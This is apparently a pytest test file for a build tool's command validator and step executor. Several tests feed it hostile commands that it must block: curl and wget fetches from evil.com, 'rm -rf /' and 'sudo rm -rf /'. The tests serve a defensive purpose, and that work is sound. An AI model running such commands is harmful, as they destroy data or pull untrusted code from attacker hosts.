"""Tests for command executor."""

import pytest

from bobthebuilder.executor import ExecutionResult, execute_step, validate_command
from bobthebuilder.models import BuildStep, Ecosystem, RiskLevel


class TestCommandValidation:
    def test_allows_npm_ci(self):
        assert validate_command(["npm", "ci"]) is True

    def test_allows_uv_sync(self):
        assert validate_command(["uv", "sync"]) is True

    def test_allows_pip_install(self):
        assert validate_command(["pip", "install", "-r", "requirements.txt"]) is True

    def test_allows_cargo_build(self):
        assert validate_command(["cargo", "build"]) is True

    def test_allows_go_mod_download(self):
        assert validate_command(["go", "mod", "download"]) is True

    def test_allows_cp(self):
        assert validate_command(["cp", ".env.example", ".env"]) is True

    def test_allows_docker_compose(self):
        assert validate_command(["docker", "compose", "up", "-d"]) is True

    def test_rejects_sudo(self):
        assert validate_command(["sudo", "npm", "install"]) is False

    def test_rejects_curl_pipe(self):
        assert validate_command(["curl", "http://evil.com/script.sh"]) is False

    def test_rejects_wget(self):
        assert validate_command(["wget", "http://evil.com/malware"]) is False

    def test_rejects_rm_rf(self):
        assert validate_command(["rm", "-rf", "/"]) is False

    def test_rejects_empty(self):
        assert validate_command([]) is False

    def test_rejects_unknown(self):
        assert validate_command(["some-random-binary", "--pwn"]) is False


class TestExecuteStep:
    def test_runs_simple_command(self, tmp_path):
        step = BuildStep(
            name="test",
            command=["echo", "hello"],
            description="Test echo",
            ecosystem=Ecosystem.NODE,
        )
        result = execute_step(step, cwd=str(tmp_path))
        assert result.success is True
        assert result.exit_code == 0
        assert "hello" in result.stdout

    def test_captures_failure(self, tmp_path):
        step = BuildStep(
            name="test",
            command=["ls", "/nonexistent_path_xyz"],
            description="Test failure",
            ecosystem=Ecosystem.NODE,
        )
        result = execute_step(step, cwd=str(tmp_path))
        assert result.success is False
        assert result.exit_code != 0

    def test_rejects_unsafe_command(self, tmp_path):
        step = BuildStep(
            name="test",
            command=["sudo", "rm", "-rf", "/"],
            description="Evil command",
            ecosystem=Ecosystem.NODE,
        )
        result = execute_step(step, cwd=str(tmp_path))
        assert result.success is False
        assert "blocked" in result.error.lower()

    def test_result_has_duration(self, tmp_path):
        step = BuildStep(
            name="test",
            command=["echo", "hi"],
            description="Test timing",
            ecosystem=Ecosystem.NODE,
        )
        result = execute_step(step, cwd=str(tmp_path))
        assert result.duration_s >= 0

    def test_result_to_dict(self, tmp_path):
        step = BuildStep(
            name="test-step",
            command=["echo", "hi"],
            description="Test",
            ecosystem=Ecosystem.NODE,
        )
        result = execute_step(step, cwd=str(tmp_path))
        d = result.to_dict()
        assert d["step"] == "test-step"
        assert d["success"] is True
        assert "duration_s" in d
